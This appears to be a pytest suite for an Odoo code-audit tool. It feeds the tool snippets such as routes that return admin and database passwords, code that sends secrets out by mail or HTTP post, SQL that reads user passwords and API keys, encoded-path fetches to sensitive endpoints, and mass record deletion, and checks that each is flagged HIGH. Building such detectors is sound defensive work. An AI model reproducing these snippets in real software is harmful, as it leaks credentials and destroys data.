"""CODE-AUDIT-14: REVIEW-CODE-AUDIT-11 (5H/4M/2L). Rule: a sink is safe only when provably bounded
and non-sensitive; anything unprovable is HIGH. Each finding: review probe, neighbours, benign twin."""
import pytest

from tests.test_nf_bot_code_audit_11 import _m, _sev, _js, P, O

CH = "from odoo import http\nfrom odoo.http import request\nimport os\nfrom odoo.tools import config\n\n\nclass C(http.Controller):\n"


def _ctl(body, auth="public"):
    return {"controllers/c.py": CH + f"    @http.route('/p', auth='{auth}', type='http')\n    def p(self, **kw):\n"
            + "".join("        " + ln + "\n" for ln in body.split("\n"))}


# ---------------------------------------------------------------- H1 secret sources
@pytest.mark.parametrize("body", [
    "k = 'database.' + 'secret'\nreturn request.env['ir.config_parameter'].sudo().get_param(k)",  # review probes
    "return request.env['ir.config_parameter'].sudo().get_param(kw.get('k'))",
    "return config['admin_passwd']",
    "return config.get('db_password')",
    "return os.environ.get('ODOO_DB_PASSWORD', '')",
    "return request.session.sid",
    "v = os.environ['X_' + kw.get('n', '')]\nreturn v",  # neighbours
    "t = request.session.session_token\nreturn {'t': t}",
    "x = os.getenv(kw['k'])\nreturn x or ''",
    "request.env['ir.config_parameter'].sudo().get_param(kw['k'])\nreturn 'ok'",
])
def test_h1_route_secret_high(body):
    assert "high" in _sev(_ctl(body), "route-secret-read")


def test_h1_authenticated_route_returning_secret_high():
    assert "high" in _sev(_ctl("return config['admin_passwd']", auth="user"), "route-secret-read")


@pytest.mark.parametrize("body", [
    "pw = config['admin_passwd']\nself.env['mail.mail'].create({'body_html': pw, 'email_to': 'a@b'})",
    "self.env['mail.mail'].create({'body_html': os.environ.get('ODOO_DB_PASSWORD')})",
    "import requests\nrequests.post('http://e', data={'k': config.get('db_password')})",
    "_logger.info('pw %s', config['admin_passwd'])",
    "k = self.env['ir.config_parameter'].sudo().get_param(self.name)\nself.message_post(body=k)",
])
def test_h1_secret_exfiltration_high(body):
    pre = "import os, logging\nfrom odoo.tools import config\n_logger = logging.getLogger(__name__)\n"
    assert "high" in _sev(_m(body, pre), "secret-exfiltration")


@pytest.mark.parametrize("body", [
    "return request.env['ir.config_parameter'].sudo().get_param('website.cookie_bar') or ''",
    "return os.environ.get('TZ', '')",
    "return config.get('addons_path', '')",
])
def test_h1_non_secret_constant_silent(body):
    assert "high" not in _sev(_ctl(body), "route-secret-read")


# ---------------------------------------------------------------- H2 raw SQL from routes / feeding mass changes
@pytest.mark.parametrize("body,auth", [
    ("request.env.cr.execute('select password from res_users')\nreturn str(request.env.cr.fetchall())", "none"),  # probe
    ("request.env.cr.execute('select login, password from res_users')\nreturn str(request.env.cr.fetchall())", "public"),
    ("request.env.cr.execute('SELECT value FROM ir_config_parameter')\nreturn 'x'", "user"),
    ("request.env.cr.execute('select key from res_users_apikeys')\nreturn 'x'", "public"),
    ("request.env.cr.execute('select name from res_partner')\nreturn str(request.env.cr.fetchall())", "public"),
    ("request.env.cr.execute('select name from res_partner')\nr = request.env.cr.dictfetchall()\nreturn str(r)", "none"),
])
def test_h2_route_sql_high(body, auth):
    assert "high" in _sev(_ctl(body, auth), "route-sql-secret")


@pytest.mark.parametrize("body", [
    "self.env.cr.execute('select id from res_partner')\nself.env['res.partner'].browse([r[0] for r in self.env.cr.fetchall()]).unlink()",  # probe
    "self.env.cr.execute('select id from res_partner')\nids = [r[0] for r in self.env.cr.fetchall()]\nself.env['res.partner'].browse(ids).write({'active': False})",
    "self._cr.execute('select id from res_partner where active')\nrows = self._cr.dictfetchall()\nself.env['res.partner'].browse([r['id'] for r in rows]).unlink()",
])
def test_h2_sql_ids_mass_change(body):
    assert "high" in _sev(_m(body), "mass-change")


def test_h2_bounded_sql_silent():
    body = "self.env.cr.execute('select id from res_partner where id = %s', [self.id])\nself.env['res.partner'].browse([r[0] for r in self.env.cr.fetchall()]).unlink()"
    assert "high" not in _sev(_m(body), "mass-change")
    pub = "request.env.cr.execute('select name from res_partner limit 5')\nreturn str(request.env.cr.fetchall())"
    assert "high" not in _sev(_ctl(pub), "route-sql-secret")


def test_h1_named_key_logged_high_but_sent_to_its_api_ok():
    pre = "import logging, requests\n_logger = logging.getLogger(__name__)\n"
    k = "k = self.env['ir.config_parameter'].sudo().get_param('x.api_key')\n"
    assert "high" in _sev(_m(k + "_logger.info('k %s', k)", pre), "secret-exfiltration")
    assert "high" not in _sev(_m(k + "requests.get('https://api.x', params={'key': k})", pre), "secret-exfiltration")


# ---------------------------------------------------------------- H3 uniqueness per (model, field); collected id lists
_UQ = "    _sql_constraints = [('n_uniq', 'unique(name)', 'x'), ('c_uniq', 'unique(code)', 'x')]\n    name = fields.Char()\n    code = fields.Char()\n"


def _mu(body):
    f = _m(body)
    f["models/a.py"] = f["models/a.py"].replace("    _description = 'a'\n", "    _description = 'a'\n" + _UQ, 1)
    return f


@pytest.mark.parametrize("body", [
    f"{P}.search([('name', '=', self.name)]).unlink()",  # probe: unique(name) is on a.a, not res.partner
    f"{P}.search([('code', '=', self.code)]).unlink()",
    f"{P}.search([('id', 'in', [g['id'] for g in {P}.search_read([], ['id'])])]).unlink()",  # probe
    f"{P}.search([('id', 'in', list(map(lambda g: g['id'], {P}.search_read([], ['id']))))]).unlink()",
    f"{P}.search([('id', 'in', [r.id for r in {P}.search([])])]).write({{'active': False}})",
    f"{P}.search([('id', 'in', {P}.search([]).mapped('id'))]).unlink()",
    f"{P}.search([('id', 'in', [r['id'] for r in {P}.read_group([], ['id'], ['id'])])]).unlink()",
])
def test_h3_mass_change_high(body):
    assert "high" in _sev(_mu(body), "mass-change")


@pytest.mark.parametrize("body", [
    "self.env['a.a'].search([('name', '=', self.name)]).unlink()",  # unique on its own model
    f"{P}.search([('id', 'in', [r.id for r in self])]).unlink()",
    f"{P}.search([('id', 'in', [g['id'] for g in {P}.search_read([('id', '=', 1)], ['id'])])]).unlink()",
])
def test_h3_bounded_silent(body):
    assert "high" not in _sev(_mu(body), "mass-change")


# ---------------------------------------------------------------- H4 route normalisation, call_button, JSON-2 parity
@pytest.mark.parametrize("src", [
    "fetch('/json/2/res.users/%77rite',{method:'POST'});",  # probes
    "fetch('/web/dataset/call_kw/res.%75sers/write',{method:'POST'});",
    "fetch('/web/dataset/./call_kw/res.users/write',{method:'POST'});",
    "fetch('/web/x/../dataset/call_kw/res.users/write',{method:'POST'});",
    "fetch('/web\\\\dataset\\\\call_kw/res.users/write',{method:'POST'});",
    "fetch('/web/dataset/call_button/res.users/action_reset_password',{method:'POST'});",
    "fetch(new URL('call_kw/res.users/write', location.origin+'/web/dataset/'),{method:'POST'});",
    "fetch(new URL('../call_kw/res.users/write', location.origin+'/web/dataset/x/'),{method:'POST'});",
    "const u=new URL('/web/dataset/call_kw/res.partner/read',location.origin); u.pathname=u.pathname.replace('partner/read','users/write'); fetch(u,{method:'POST'});",
    "fetch('/web/dataset/call_kw%2Fres.users%2Fwrite',{method:'POST'});",  # neighbours
    "fetch('/web//dataset//call_kw/res.users/unlink',{method:'POST'});",
    "fetch('/json/2/res.users/write/.',{method:'POST'});",
    "fetch('/web/dataset/call_button',{method:'POST',body:JSON.stringify({params:{model:'res.users',method:'action_reset_password',args:[[1]]}})});",
])
def test_h4_normalised_route_sensitive_high(src):
    assert "high" in _sev(_js(src), "js-sensitive-model")


@pytest.mark.parametrize("src", [
    "const r=await (await fetch('/json/2/res.partner/search',{method:'POST',body:JSON.stringify({domain:[]})})).json(); fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids:r})});",  # probe
    "const r=await (await fetch('/json/2/res.partner/search',{method:'POST',body:JSON.stringify({})})).json(); fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids:r})});",
])
def test_h4_json2_search_unlink_mass(src):
    assert "high" in _sev(_js(src), "js-mass-change")


def test_h4_benign_routes_silent():
    for src in ("fetch('/web/image/res.partner/1/avatar_128');",
                "fetch('/web/dataset/call_kw/res.partner/read',{method:'POST',body:JSON.stringify({params:{args:[[1]]}})});"):
        assert "high" not in _sev(_js(src), "js-sensitive-model")
    j2 = "const r=await (await fetch('/json/2/res.partner/search',{method:'POST',body:JSON.stringify({domain:[['id','=',1]]})})).json(); fetch('/json/2/res.partner/unlink',{method:'POST',body:JSON.stringify({ids:r})});"
    assert "high" not in _sev(_js(j2), "js-mass-change")


# ---------------------------------------------------------------- H5 view-state domain laundering
_DEL5 = "await this.orm.unlink('res.partner', await this.orm.search('res.partner', {d}));"


def _comp5(body, d="this.state.domain"):
    return ("class C extends Component {\n setup(){ this.state = useState({domain: [['id','=',1]]}); }\n"
            "onSearch(d){ this.state.domain = d; }\n" + body + "\n async go(){ " + _DEL5.format(d=d) + " }\n}")


@pytest.mark.parametrize("body,d", [
    ("wipe(){ const s = this.state; const t = s; t.domain = []; }", "this.state.domain"),  # probes
    ("wipe(){ const d = this.state.domain; d.splice(0); }", "this.state.domain"),
    ("wipe(){ Reflect.set(this.state, 'domain', []); }", "this.state.domain"),
    ("wipe(){ this.state['domain'] = []; }", "this.state.domain"),
    ("wipe(){ const k = 'domain'; this.state[k] = []; }", "this.state.domain"),
    ("wipe(){ const {domain} = this.state; domain.length = 0; }", "this.state.domain"),
    ("wipe(){ }", "(() => { const d = [...this.state.domain]; d.length = 0; return d; })()"),
    ("wipe(){ const s = this; const t = s.state; const u = t; u.domain = []; }", "this.state.domain"),  # neighbours
    ("wipe(){ const {domain: dd} = this.state; dd.push('|', ['id','!=',0]); }", "this.state.domain"),
    ("wipe(k){ this.state[k] = []; }", "this.state.domain"),
    ("wipe(k){ Reflect.set(this.state, k, []); }", "this.state.domain"),
    ("wipe(){ Reflect.set(this.state.domain, 'length', 0); }", "this.state.domain"),
    ("wipe(){ const s = this.state; s['domain'].splice(0); }", "this.state.domain"),
    ("wipe(){ Reflect.deleteProperty(this.state, 'domain'); }", "this.state.domain"),
])
def test_h5_laundered_state_domain_high(body, d):
    assert "high" in _sev(_js(_comp5(body, d)), "js-mass-change")


@pytest.mark.parametrize("body", [
    "",  # twins: user selection only / other keys
    "wipe(){ const s = this.state; s.other = []; }",
    "wipe(){ this.state['limit'] = 5; }",
    "wipe(){ Reflect.set(this.state, 'limit', 5); }",
    "wipe(){ const {domain} = this.state; console.log(domain.length); }",
])
def test_h5_benign_twins_silent(body):
    assert "high" not in _sev(_js(_comp5(body)), "js-mass-change")
